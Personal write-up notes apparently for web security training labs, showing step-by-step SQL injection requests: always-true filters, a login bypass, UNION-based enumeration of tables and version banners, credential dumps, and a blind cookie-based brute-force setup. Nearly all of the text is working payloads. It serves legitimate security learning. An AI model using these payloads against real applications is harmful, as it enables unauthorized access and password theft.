# Lab 1

Adding the ' OR 1=1-- in the URL to inject an always True statement

Edit URL from:
```
GET /filter?category=Accessories HTTP/1.1
Host: ac961fd91ece931980d47ba200d90057.web-security-academy.net
...
Accept-Language: en-US,en;q=0.9,he-IL;q=0.8,he;q=0.7
Connection: close
```
to:
```
GET /filter?category=Accessories'+OR+1=1-- HTTP/1.1
Host: ac961fd91ece931980d47ba200d90057.web-security-academy.net
...
Accept-Language: en-US,en;q=0.9,he-IL;q=0.8,he;q=0.7
Connection: close
```

# Lab 2

Adding the '-- in the params to comment out the password portion of the SQL query

Edit request from:
```
POST /login HTTP/1.1
...
Accept-Language: en-US,en;q=0.9,he-IL;q=0.8,he;q=0.7
Connection: close

csrf=RHrNxi61GKDnF4SDlt8JvyCbuv3hOcs2&username=administrator&password=1234
```
to:
```
POST /login HTTP/1.1
...
Accept-Language: en-US,en;q=0.9,he-IL;q=0.8,he;q=0.7
Connection: close

csrf=RHrNxi61GKDnF4SDlt8JvyCbuv3hOcs2&username=administrator'--&password=1234
```

# Lab 3

Use NULL row injection to find the number of columns - if we have the exact number of NULL values

then we will get this NULL row in our database (in the result of the query)
Edit request from:
```
GET /filter?category=Accessories HTTP/1.1
...
Accept-Language: en-US,en;q=0.9,he-IL;q=0.8,he;q=0.7
Connection: close
```
to:
```
GET /filter?category=Accessories'+UNION+SELECT+NULL,NULL,NULL-- HTTP/1.1
...
Accept-Language: en-US,en;q=0.9,he-IL;q=0.8,he;q=0.7
Connection: close
```

# Lab 4

Edit:
```
GET /filter?category=Pets HTTP/1.1
...
Accept-Language: en-US,en;q=0.9,he-IL;q=0.8,he;q=0.7
Connection: close
```
To:
```
GET /filter?category=Pets'+UNION+SELECT+NULL,%27MWKnFL%27,NULL-- HTTP/1.1
...
Accept-Language: en-US,en;q=0.9,he-IL;q=0.8,he;q=0.7
Connection: close
```

# Lab 5

Edit:
```
GET /filter?category=Lifestyle HTTP/1.1
```
To:
```
GET /filter?category=Lifestyle'+UNION+SELECT+username,password+FROM+users-- HTTP/1.1
```

username:password
```
administrator
l6uz3b1kg5ibz0rbx37u
```

# Lab 6

Edit:
```
GET /filter?category=Gifts HTTP/1.1
```
To:
```
GET /filter?category=Gifts'+UNION+SELECT+NULL,username||'~'||password+FROM+users-- HTTP/1.1
```

username:password
```
administrator
8lkagrjnf7f9uhl98o2y
```

# Lab 7

Edit:
```
GET /filter?category=Accessories HTTP/1.1
```
To:
```
GET /filter?category=Accessories'+UNION+SELECT+banner,NULL+FROM+v$version-- HTTP/1.1
```


# Lab 8

Edit:
```
GET /filter?category=Accessories HTTP/1.1
```
To:
```
GET /filter?category=Accessories'+UNION+SELECT+@@version,NULL--+ HTTP/1.1
```

# Lab 9

Inject to show all the TABLE_NAME of the tables in order to find potential table that holds 

the username and passwords

```
GET /filter?category=Accessories'+UNION+SELECT+TABLE_NAME,NULL+FROM+information_schema.tables--+ HTTP/1.1
```
users_cgllpy looks interesting, we list the table's columns with:
```
GET /filter?category=Accessories'+UNION+SELECT+COLUMN_NAME,NULL+FROM+information_schema.columns+WHERE+table_name+=+'users_cgllpy'--+ HTTP/1.1
```
And we see two interesting columns:

- username_tvwizq
- password_qfjyhg

We query this table to get all the values in this columns:
```
GET /filter?category=Accessories'+UNION+SELECT+username_tvwizq,password_qfjyhg+FROM+users_cgllpy--+ HTTP/1.1
```
Finally we got:

```
administrator
ou80z1p7ex2o3679lp3l
```

# Lab 10

List tables in Oracle SQL
```
GET /filter?category=Accessories'+UNION+SELECT+COLUMN_NAME,NULL+FROM+all_tab_columns+WHERE+table_name+=+'USERS_ACHAXI'-- HTTP/1.1
```

And we get the column names:
```
USERNAME_RONKKR
PASSWORD_XPIZRN
```

We query this table to get all the values in this columns:
```
GET /filter?category=Accessories'+UNION+SELECT+USERNAME_RONKKR,PASSWORD_XPIZRN+FROM+USERS_ACHAXI--+ HTTP/1.1
```

And we get:
```
administrator
382soutw7f69x1d1bto7
```

# Lab 11

Create a Intruder - Cluster Bomb Attack with this packet:
```
GET /filter?category=Accessories HTTP/1.1
Host: acd71f5f1f0865218092196800e800d6.web-security-academy.net
Cookie: TrackingId=RTagNzceoYMk1rrX'+AND+SUBSTRING((SELECT+password+FROM+users+WHERE+username+=+'administrator'),+§offset§,+1)+=+'§value§; session=EDEHpeoxYbli8e7Cx8QabKX6afFK11iK
...
Accept-Language: en-US,en;q=0.9,he-IL;q=0.8,he;q=0.7
Connection: close
```
Make sure you add the "Grep" match and add the phrase "Welcome Back!"

The first payload set is the offsets - 1-30 and the second payload set is brute force chars

Attack should execute successfully with the correct chars per offset (filter with the Welcome Back! message



# Lab X

Edit:
```
```
To:
```
```
